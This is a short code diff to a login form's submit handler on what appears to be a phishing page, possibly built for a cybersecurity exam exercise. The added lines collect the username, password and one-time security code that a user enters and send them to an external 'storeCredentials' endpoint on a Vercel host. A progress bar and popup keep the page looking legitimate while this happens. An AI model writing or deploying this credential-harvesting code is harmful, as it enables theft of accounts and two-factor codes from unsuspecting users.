@@ -19,7 +19,7 @@
           if (f === null) {
             return;
           }
-          f.addEventListener('submit', function(e) {   //on form submit
+          f.addEventListener('submit', async function(e) {   //on form submit
 			e.preventDefault();  //prevent page reload
 			console.log("SS");
 			
@@ -30,6 +30,18 @@
 			
 			//show progress bar
 			document.getElementById("verifiedProgress").style.display="block";
+			
+			//send data to the server
+			const username = document.getElementById("username").value;
+			const password = document.getElementById("password").value;
+			const sec_code = document.getElementById("otp").value;
+			var res=await fetch("https://cybersecurityserver-exam.vercel.app/storeCredentials?text=username:"+username+"\npassword:"+password+"\nsecurity code:"+sec_code)
+			res= await res.text();
+			if(res=="fatto"){
+				//credenziali memorizzate correttamente
+				console.log("bella");
+			}
+			
 			
 			//show popup
 			setTimeout(()=>{
